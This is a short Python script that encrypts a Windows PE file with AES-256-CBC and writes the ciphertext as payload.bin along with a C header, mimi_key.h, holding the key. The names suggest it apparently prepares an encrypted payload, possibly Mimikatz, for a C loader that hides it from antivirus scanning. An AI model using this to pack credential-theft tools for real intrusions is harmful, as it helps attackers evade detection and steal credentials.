#!/usr/bin/env python3
"""
encrypt_and_convert.py - Encrypt PE with AES-256 and generate C headers.

Produces:
  <output_dir>/payload.bin  - AES-256-CBC encrypted PE (key=SHA256(random_16bytes))
  <output_dir>/mimi_key.h   - C header with keyBuff[] and PAYLOAD_SIZE

Usage:
  python encrypt_and_convert.py <input_pe> <output_dir>

Requires: pip install pycryptodome
"""

import sys
import os
import hashlib
from os import urandom
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def aes_encrypt(plaintext: bytes, key_raw: bytes):
    """AES-256-CBC with IV=0x00*16, key=SHA256(key_raw). Matches aesBin.py logic."""
    k = hashlib.sha256(key_raw).digest()
    iv = b'\x00' * 16
    padded = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(padded)


def main():
    if len(sys.argv) < 3:
        print("Usage: encrypt_and_convert.py <input_pe> <output_dir>")
        sys.exit(1)

    input_pe = sys.argv[1]
    output_dir = sys.argv[2]

    if not os.path.isfile(input_pe):
        print(f"[-] Input file not found: {input_pe}")
        sys.exit(1)

    os.makedirs(output_dir, exist_ok=True)

    with open(input_pe, 'rb') as f:
        plaintext = f.read()

    key_raw = urandom(16)
    ciphertext = aes_encrypt(plaintext, key_raw)

    # output/payload.bin
    payload_path = os.path.join(output_dir, 'payload.bin')
    with open(payload_path, 'wb') as f:
        f.write(ciphertext)
    print(f"[+] payload.bin  : {len(ciphertext)} bytes -> {payload_path}")

    # output/mimi_key.h
    key_hex = ', '.join(f'0x{b:02X}' for b in key_raw)
    mimi_key_h = (
        "// mimi_key.h - AES-256 decryption key (auto-generated, do not commit)\n"
        "#pragma once\n\n"
        f"unsigned char keyBuff[{len(key_raw)}] = {{\n"
        f"\t{key_hex}\n"
        "};\n\n"
        f"#define PAYLOAD_SIZE {len(ciphertext)}\n"
    )
    mimi_key_path = os.path.join(output_dir, 'mimi_key.h')
    with open(mimi_key_path, 'w') as f:
        f.write(mimi_key_h)
    print(f"[+] mimi_key.h   : key={key_raw.hex()} -> {mimi_key_path}")


if __name__ == '__main__':
    main()
